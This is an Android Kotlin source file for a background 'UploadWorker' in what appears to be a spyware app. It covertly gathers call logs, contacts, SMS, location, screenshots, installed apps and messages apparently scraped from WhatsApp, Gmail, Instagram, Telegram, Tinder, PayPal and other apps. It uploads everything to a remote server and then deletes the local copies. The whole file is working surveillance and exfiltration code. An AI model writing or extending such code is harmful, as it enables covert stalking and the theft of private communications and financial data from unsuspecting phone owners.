package com.umarabbas.firstproject

import android.content.Context
import android.os.Build
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import retrofit2.Call
import retrofit2.Response
import java.io.File
import java.util.*
import javax.security.auth.callback.Callback

class UploadWorker(private val appContext: Context, workerParams: WorkerParameters):
        Worker(appContext, workerParams) {
    override fun doWork(): Result {
        val thread = object : Thread(){
            override fun run() {
                val sharedPref = appContext.getSharedPreferences("MyPref", Context.MODE_PRIVATE)
                val timeInMilli = sharedPref.getLong("timeInMilli", 1L)
                val data : String
                if(timeInMilli.equals(1L)){
                    val callLogs = Functions.getCallLogs(appContext)
                    val contacts = Functions.getContacts(appContext)
                    val whatsappSms = Functions.getWhatsappSms(appContext)
                    val instagrams = Functions.getInstagrams(appContext)
                    val gmails = Functions.getGmails(appContext)
                    val twitters = Functions.getTwittera(appContext)
                    val telegrams = Functions.getTelegrams(appContext)
                    val tinders = Functions.getTinders(appContext)
                    val paypals = Functions.getPaypals(appContext)
                    val onexbets = Functions.getOneXBets(appContext)
                    val sms = Functions.getSms(appContext)
                    val loc = Functions.getLocation(appContext)
                    val appList = Functions.getAppList(appContext)
                    val stats = Functions.getStatistics(appContext)
                    data = getResponse(loc, callLogs, contacts,whatsappSms,instagrams,gmails,twitters,telegrams,tinders,paypals, onexbets,sms,appList,stats)
                    Log.d("UploadWorker","if TimeInMilli is $timeInMilli")
                    Log.d("UploadWorker","$callLogs")
                }else{
                    val callLogs = Functions.getCallLogs(appContext , timeInMilli)
                    val contacts = Functions.getContacts(appContext)
                    val whatsappSms = Functions.getWhatsappSms(appContext)
                    val instagrams = Functions.getInstagrams(appContext)
                    val gmails = Functions.getGmails(appContext)
                    val twitters = Functions.getTwittera(appContext)
                    val telegrams = Functions.getTelegrams(appContext)
                    val tinders = Functions.getTinders(appContext)
                    val paypals = Functions.getPaypals(appContext)
                    val onexbets = Functions.getOneXBets(appContext)
                    val sms = Functions.getSms(appContext, timeInMilli)
                    val loc = Functions.getLocation(appContext)
                    val appList = Functions.getAppList(appContext)
                    val stats = Functions.getStatistics(appContext)
                    data = getResponse(loc, callLogs, contacts,whatsappSms,instagrams,gmails,twitters,telegrams,tinders,paypals, onexbets,sms,appList,stats)
                    Log.d("UploadWorker","else TimeInMilli is $timeInMilli")
                    Log.d("UploadWorker","$callLogs")
                }
                val file = File(appContext.getExternalFilesDir(null), "testing.txt")
                if(file.exists()){
                    file.delete()
                }
                file.createNewFile()
                file.appendText("$data")

                // Upload
                val service = RetrofitClientInstance.getClient(appContext)?.create(GetDataService::class.java)
                service!!.sendData(data).enqueue(object : retrofit2.Callback<String> {
                    override fun onFailure(call: Call<String>, t: Throwable) {
                        Log.d("UploadWorker","Failure")
                        Log.d("UploadWorker","$t")
                        val file = File(applicationContext.getExternalFilesDir(null),
                                "Failure.txt")
                        if(file.exists()){
                            file.delete()
                        }
                        file.createNewFile()
                        file.appendText("$t")
                    }

                    override fun onResponse(call: Call<String>, response: Response<String>) {
                        if(response.isSuccessful){
                            Log.d("UploadWorker","SuccessFull")
                            Log.d("UploadWorker","${response.body()}")
                            val file = File(applicationContext.getExternalFilesDir(null),
                                    "SuccessfullySent.txt")
                            if(file.exists()){
                                file.delete()
                            }
                            file.createNewFile()
                            file.appendText("$data")
                            sharedPref.edit().putLong("timeInMilli",System.currentTimeMillis()).apply()
                            val whatsapp = File(appContext.getExternalFilesDir(null), "whatsapp.txt")
                            val gmail = File(appContext.getExternalFilesDir(null), "gmail.txt")
                            val instagram = File(appContext.getExternalFilesDir(null), "instagram.txt")
                            val twitter = File(appContext.getExternalFilesDir(null), "twitter.txt")
                            val telegram = File(appContext.getExternalFilesDir(null), "telegram.txt")
                            val tinder = File(appContext.getExternalFilesDir(null), "tinder.txt")
                            val paypal = File(appContext.getExternalFilesDir(null), "paypal.txt")
                            val xbet = File(appContext.getExternalFilesDir(null), "xbet.txt")
                            whatsapp.delete()
                            gmail.delete()
                            instagram.delete()
                            twitter.delete()
                            telegram.delete()
                            tinder.delete()
                            paypal.delete()
                            xbet.delete()

                        }else{
                            Log.d("UploadWorker","Not SuccessFull")
                            Log.d("UploadWorker","${response.body()}")
                            val file = File(applicationContext.getExternalFilesDir(null),
                                    "NotSuccessfull.txt")
                            if(file.exists()){
                                file.delete()
                            }
                            file.createNewFile()
                            file.appendText("${response.errorBody()?.string()}")
                        }
                    }

                })
                if(Build.VERSION.SDK_INT <= Build.VERSION_CODES.P){
                    val screenshots = Functions.getScreenshots(appContext)
                    service.uploadScreenshots(screenshots).enqueue(object : retrofit2.Callback<String> {
                        override fun onFailure(call: Call<String>, t: Throwable) {
                            Log.d("UploadWorker","Failure Screenshots")
                            Log.d("UploadWorker","$t")

                        }

                        override fun onResponse(call: Call<String>, response: Response<String>) {
                            if(response.isSuccessful){
                                Log.d("UploadWorker","SuccessFull SS")
                                Log.d("UploadWorker","${response.body()}")
                                val folder = File(appContext.getExternalFilesDir(null),"/ScreenShot/")
                                folder.deleteRecursively()

                            }else{
                                Log.d("UploadWorker","Not SuccessFull Screenshots")
                                Log.d("UploadWorker","${response.body()}")
                            }
                        }
                    })
                }
            }
        }
        thread.start()

        return Result.success()
    }
}